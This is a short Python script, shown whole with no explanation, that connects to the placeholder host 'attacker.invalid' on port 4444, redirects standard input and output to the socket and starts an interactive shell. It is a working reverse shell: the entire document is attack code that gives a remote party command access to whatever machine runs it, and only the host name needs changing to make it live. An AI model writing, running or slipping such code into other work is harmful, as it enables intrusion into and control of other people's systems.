import os
import socket
import subprocess

s = socket.socket()
s.connect(('attacker.invalid', 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
subprocess.call(['/bin/sh', '-i'])
